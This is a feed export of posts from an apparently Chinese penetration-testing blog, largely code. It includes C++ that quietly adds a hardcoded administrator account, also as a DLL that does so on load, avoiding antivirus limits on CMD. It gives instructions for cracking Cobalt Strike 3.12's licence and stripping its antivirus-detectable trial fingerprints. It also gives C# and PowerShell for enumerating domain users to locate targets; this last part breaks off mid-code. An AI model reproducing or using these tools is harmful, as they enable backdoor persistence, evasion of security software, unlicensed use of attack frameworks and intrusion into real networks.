class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserInfoAdd.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"netapi32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 定义USER_INFO_1结构体</span></span><br><span class="line">USER_INFO_1 UserInfo;</span><br><span class="line">DWORD dwLevel = <span class="number">1</span>;</span><br><span class="line">DWORD dwError = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">UserInfo.usri1_name = <span class="string">L"Admins"</span>;            <span class="comment">// 账户    </span></span><br><span class="line">UserInfo.usri1_password = <span class="string">L"P@ssword233"</span>;      <span class="comment">// 密码</span></span><br><span class="line">UserInfo.usri1_priv = USER_PRIV_USER;</span><br><span class="line">UserInfo.usri1_home_dir = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_comment = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_flags = UF_SCRIPT;</span><br><span class="line">UserInfo.usri1_script_path = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加名为Admins的用户,密码为P@ssword233 </span></span><br><span class="line">NetUserAdd(<span class="literal">NULL</span>, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加用户到administrators组</span></span><br><span class="line">LOCALGROUP_MEMBERS_INFO_3 account;</span><br><span class="line">account.lgrmi3_domainandname = UserInfo.usri1_name;</span><br><span class="line">NetLocalGroupAddMembers(<span class="literal">NULL</span>, <span class="string">L"Administrators"</span>, <span class="number">3</span>, (LPBYTE)&amp;account, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二）dll生成"><a href="#二）dll生成" class="headerlink" title="二）dll生成"></a>二）dll生成</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#ifndef UNICODE</span></span><br><span class="line"><span class="meta">#define UNICODE</span></span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="string">"netapi32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlimage.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> NetUserAdd()</span><br><span class="line">&#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason) &#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">NetUserAdd()<span class="comment">;</span></span><br><span class="line"><span class="built_in">break</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="built_in">break</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">TRUE</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译代码的时候，选择MT，所有的依赖文件都会编进去。<br><img src="/image/【编程】创建用户，并添加至管理组/blog_2018-11-15_11-35-4320.png" alt="blog_2018-11-15_11-35-4320"></p><h2 id="0x02-备注"><a href="#0x02-备注" class="headerlink" title="0x02 备注"></a>0x02 备注</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">支持最低客户端:Windows 2000 Professional [仅desktop apps]</span><br><span class="line">支持最低服务器:Windows 2000<span class="built_in"> Server </span>[仅desktop apps]</span><br><span class="line">目标平台: Windows</span><br><span class="line">Header: lmaccess.h (include Lm.h)</span><br><span class="line">Library: Netapi32.lib</span><br><span class="line">DLL: Netapi32.dll</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要: 因有些需求，需要本地/远程添加用户。所以直接选择&lt;code&gt;Windows API函数&lt;/code&gt;进行编写，因为部分杀软限制了&lt;code&gt;CMD&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
      <category term="C++" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【渗透技巧】CobaltStrike 3.12 破解</title>
    <link href="https://rcoil.me/2018/10/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91CobaltStrike%203.12%20%E7%A0%B4%E8%A7%A3/"/>
    <id>https://rcoil.me/2018/10/【渗透技巧】CobaltStrike 3.12 破解/</id>
    <published>2018-10-21T07:40:19.000Z</published>
    <updated>2019-10-31T16:31:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>听说有更新，所以就拿来看看，按照 3.8 的破解流程。<br><a id="more"></a></p><h2 id="0x00-Cobalt-Strike3-12-下载"><a href="#0x00-Cobalt-Strike3-12-下载" class="headerlink" title="0x00 Cobalt Strike3.12 下载"></a>0x00 Cobalt Strike3.12 下载</h2><p>原版：<a href="https://github.com/microidz/Cobaltstrike-Trial" target="_blank" rel="noopener">https://github.com/microidz/Cobaltstrike-Trial</a></p><p>校验：<a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener">https://verify.cobaltstrike.com/</a></p><p>xor.bin：<a href="https://github.com/verctor/CS_xor64" target="_blank" rel="noopener">https://github.com/verctor/CS_xor64</a></p><p>破解记录</p><h2 id="0x01-文件文件位置"><a href="#0x01-文件文件位置" class="headerlink" title="0x01 文件文件位置"></a>0x01 文件文件位置</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">common/License.<span class="keyword">class</span>  <span class="meta"># 修改时间及提示框</span></span><br><span class="line">common/ArtifactUtils.<span class="keyword">class</span>  <span class="meta"># 去除后门特征指纹</span></span><br><span class="line">server/ProfileEdits.<span class="keyword">class</span> <span class="meta"># 去除后门特征指纹</span></span><br><span class="line">aggressor/dialogs/ListenerDialog.<span class="keyword">class</span>  <span class="meta"># 去除listener个数限制</span></span><br><span class="line">aggressor/AggressorClient.<span class="keyword">class</span>  <span class="meta"># 标题栏修改</span></span><br><span class="line">resources/template.x64.ps1、template.x86.ps1 <span class="meta"># 去除后门特征指纹</span></span><br><span class="line">resources/<span class="keyword">xor</span>.bin  <span class="meta"># 放入xor.bin文件</span></span><br><span class="line">resources/xor64.bin  <span class="meta"># 放入xor.bin文件</span></span><br></pre></td></tr></table></figure><h2 id="0x02-License-class"><a href="#0x02-License-class" class="headerlink" title="0x02 License.class"></a>0x02 License.class</h2><p>首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行<code>jad.exe License.class</code>，jad目录下就会生成<code>License.jad</code>，修改后缀为<code>Java</code>，即是源码文件了。</p><p>这里将提供两种破解思路。</p><ul><li><p>(1) 直接修改试用时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">21L</span>;</span><br><span class="line">将<span class="number">21</span>天的试用期修改成</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> life = <span class="number">99999L</span>;</span><br></pre></td></tr></table></figure></li><li><p>(2) 修改isTrail的判断逻辑 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">修改成</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isTrial</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p>往下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization auth)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line">修改成</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseGUI</span><span class="params">(Authorization authorization)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">同理</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkLicenseConsole</span><span class="params">(Authorization authorization)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-去除listener个数限制"><a href="#0x03-去除listener个数限制" class="headerlink" title="0x03 去除listener个数限制"></a>0x03 去除listener个数限制</h2><p>文件在<code>aggressor/dialogs/ListenerDialog.class</code></p><p>去除<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal)))</span><br><span class="line">        &#123;</span><br><span class="line">            DialogUtils.showError(<span class="string">"You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br></pre></td></tr></table></figure></p><h2 id="0x04-后门特征指纹"><a href="#0x04-后门特征指纹" class="headerlink" title="0x04 后门特征指纹"></a>0x04 后门特征指纹</h2><p>试用版本的Cobalt Strike有固定的指纹：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">X5O</span>!<span class="selector-tag">P</span>%@<span class="keyword">AP</span>[<span class="keyword">4</span>\\<span class="keyword">PZX54</span>(<span class="keyword">P</span>^)<span class="keyword">7CC</span>)<span class="keyword">7</span>&#125;$<span class="keyword">EICAR</span>-<span class="keyword">STANDARD</span>-<span class="keyword">ANTIVIRUS</span>-<span class="keyword">TEST</span>-<span class="keyword">FILE</span>!$<span class="keyword">H</span>+<span class="keyword">H</span>*</span><br></pre></td></tr></table></figure><p>存在后门特征指纹的其中几个地方</p><ul><li>common/ArtifactUtils.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">packer.addString(<span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure><ul><li>resources/template.x64.ps1、template.x86.ps1</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$eicar</span> = 'X5O!P%@<span class="keyword">AP</span>[4\PZX54(P^)7CC)7&#125;<span class="variable">$EICAR</span>-STANDARD-ANTIVIRUS-<span class="keyword">TEST</span>-<span class="keyword">FILE</span>!<span class="variable">$H</span>+<span class="keyword">H</span>*'</span><br></pre></td></tr></table></figure><ul><li>server/ProfileEdits.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c2profile.addCommand(<span class="string">".http-get.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-post.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".http-stager.server"</span>, <span class="string">"!header"</span>, <span class="string">"X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x86"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br><span class="line">c2profile.addCommand(<span class="string">".stage.transform-x64"</span>, <span class="string">"append"</span>, <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x05-结果"><a href="#0x05-结果" class="headerlink" title="0x05 结果"></a>0x05 结果</h2><p>最后使用<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">javac</span> <span class="selector-tag">-classpath</span> <span class="selector-tag">cobaltstrike</span><span class="selector-class">.jar</span> <span class="selector-tag">xxxx</span><span class="selector-class">.java</span></span><br></pre></td></tr></table></figure></p><p>进行编译<br><img src="/image/【渗透技巧】CobaltStrike 3.12 破解/Snipaste_2018-11-08_17-38-29.PNG" alt="Snipaste_2018-11-08_17-38-29"></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/2170" target="_blank" rel="noopener">https://xz.aliyun.com/t/2170</a><br><a href="https://www.cnblogs.com/ssooking/p/9825917.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/9825917.html</a><br><a href="https://www.bilibili.com/video/av34171888/" target="_blank" rel="noopener">https://www.bilibili.com/video/av34171888/</a><br><a href="https://github.com/Lz1y/cobalt_strike_3.12_patch" target="_blank" rel="noopener">https://github.com/Lz1y/cobalt_strike_3.12_patch</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说有更新，所以就拿来看看，按照 3.8 的破解流程。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="渗透技巧" scheme="https://rcoil.me/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】批量 Net User Uname /domain</title>
    <link href="https://rcoil.me/2018/08/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%89%B9%E9%87%8FNet-User/"/>
    <id>https://rcoil.me/2018/08/【域渗透】批量Net-User/</id>
    <published>2018-08-01T09:32:25.000Z</published>
    <updated>2019-10-31T15:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>域内批量执行 <code>net user Uname /domain</code></p><a id="more"></a><h2 id="0x00使用场景"><a href="#0x00使用场景" class="headerlink" title="0x00使用场景"></a>0x00使用场景</h2><p>在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。<br>查找域用户对应的 <code>Full Name</code> 信息，从而确认目标任务对应的域用户。</p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><p>代码其实很简单，使用 C# 进行编写，可自行编译。</p><p>将所有域用户导入<code>user.txt</code>中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行<code>net user Uname /domain</code>，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">domain</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Tools By RcoIl \r"</span>);</span><br><span class="line">            <span class="keyword">string</span> currentDirectory = Environment.CurrentDirectory;</span><br><span class="line">            <span class="keyword">string</span> text = currentDirectory + <span class="string">"\\user.txt"</span>; <span class="comment">// 文件绝对路径</span></span><br><span class="line">            <span class="keyword">if</span> (!File.Exists(text))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"File not found "</span> + text); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                FileStream stream = <span class="keyword">new</span> FileStream(text, FileMode.Open, FileAccess.Read); <span class="comment">// 打开文本</span></span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader streamReader = <span class="keyword">new</span> StreamReader(stream, Encoding.Default); <span class="comment">// 实例化</span></span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">while</span> (!streamReader.EndOfStream) <span class="comment">// 读取文本</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">string</span> text2;</span><br><span class="line">                            <span class="keyword">if</span> ((text2 = streamReader.ReadLine()) != <span class="literal">null</span> &amp;&amp; text2.Length != <span class="number">0</span>) </span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">string</span> id = text2;</span><br><span class="line">                                Program.Check(id);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">finally</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (streamReader != <span class="literal">null</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            ((IDisposable)streamReader).Dispose();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stream != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        ((IDisposable)stream).Dispose();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Console.WriteLine(<span class="string">"============================================================"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">"Finish!"</span>);</span><br><span class="line">                GC.Collect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Check</span>(<span class="params"><span class="keyword">string</span> id</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            System.Diagnostics.ProcessStartInfo proccessStartInfo = <span class="keyword">new</span> System.Diagnostics.ProcessStartInfo(<span class="string">"net"</span>, <span class="string">"user "</span> + id + <span class="string">" /domain"</span>);</span><br><span class="line">            proccessStartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">            System.Diagnostics.Process proc = <span class="keyword">new</span> System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;;</span><br><span class="line"></span><br><span class="line">            proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>; <span class="comment">// 由调用程序获取输出信息</span></span><br><span class="line">            proc.StartInfo.UseShellExecute = <span class="literal">false</span>; <span class="comment">// 是否使用操作系统shell启动</span></span><br><span class="line">            proc.StartInfo.CreateNoWindow = <span class="literal">true</span>; <span class="comment">// 不显示程序窗口</span></span><br><span class="line">            proc.Start();  <span class="comment">// 启动程序</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">string</span> outlist = proc.StandardOutput.ReadToEnd(); <span class="comment">// 获取cmd窗口的输出信息</span></span><br><span class="line"></span><br><span class="line">            Regex reg = <span class="keyword">new</span> Regex(<span class="string">".*ame.*"</span>);</span><br><span class="line">            MatchCollection result = reg.Matches(outlist);</span><br><span class="line">            Console.WriteLine(<span class="string">"============================================================"</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (Match match <span class="keyword">in</span> result)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(match);</span><br><span class="line">            &#125;</span><br><span class="line">            proc.WaitForExit(); <span class="comment">// 等待程序执行完退出进程</span></span><br><span class="line">            proc.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果图：</p><p><img src="/image/【域渗透】批量Net-User/1.png" alt=""></p><h2 id="0x02-改进-20190418"><a href="#0x02-改进-20190418" class="headerlink" title="0x02 改进 (20190418)"></a>0x02 改进 (20190418)</h2><p>由于上面的代码略蠢，所以我决定将它进行改进。</p><ul><li>使用 <code>System.DirectoryServices.ActiveDirectory</code> 列举用户；</li><li>使用 <code>msvcrt.dll</code> 执行系统命令；</li></ul><h3 id="1-powershell-列举用户列表"><a href="#1-powershell-列举用户列表" class="headerlink" title="1) powershell 列举用户列表"></a>1) powershell 列举用户列表</h3><p>这份代码在网上已经很成熟了，可自行查阅。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> DomainUserList</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取当前 Domain 值</span></span><br><span class="line"><span class="variable">$DomainObject</span> =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line">    <span class="variable">$CurrentDomain</span> = <span class="string">"LDAP://"</span> + ([ADSI]<span class="string">""</span>).distinguishedName</span><br><span class="line"></span><br><span class="line">    <span class="variable">$UserSearcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher([ADSI]<span class="variable">$CurrentDomain</span>)</span><br><span class="line">    <span class="variable">$DirEntry</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectoryEntry</span><br><span class="line">    <span class="variable">$UserSearcher</span>.SearchRoot = <span class="variable">$DirEntry</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$lockoutThreshold</span> = [int]<span class="variable">$DirEntry</span>.lockoutThreshold.Value</span><br><span class="line">    <span class="built_in">Write-Host</span> -ForegroundColor <span 